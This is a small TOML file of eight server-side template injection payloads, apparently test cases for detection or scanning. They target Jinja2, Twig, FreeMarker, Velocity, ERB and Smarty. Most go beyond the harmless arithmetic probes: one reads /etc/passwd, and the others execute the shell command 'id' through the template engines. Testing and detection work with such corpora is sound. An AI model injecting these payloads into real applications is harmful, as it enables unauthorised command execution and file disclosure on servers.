schema = 1

[[case]]
id = "jinja2_arith"
class = "ssti"
payload = "{{7*7}}"

[[case]]
id = "jinja2_subprocess"
class = "ssti"
payload = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"

[[case]]
id = "twig_arith"
class = "ssti"
payload = "{{7*'7'}}"

[[case]]
id = "twig_filter"
class = "ssti"
payload = "{{ _self.env.registerUndefinedFilterCallback(\"exec\") }}{{ _self.env.getFilter(\"id\") }}"

[[case]]
id = "freemarker_exec"
class = "ssti"
payload = "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"

[[case]]
id = "velocity_exec"
class = "ssti"
payload = "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($p=$rt.getMethod('exec',$x.class).invoke($rt.getMethod('getRuntime').invoke(null),'id'))"

[[case]]
id = "erb_exec"
class = "ssti"
payload = "<%= `id` %>"

[[case]]
id = "smarty_exec"
class = "ssti"
payload = "{php}echo `id`;{/php}"
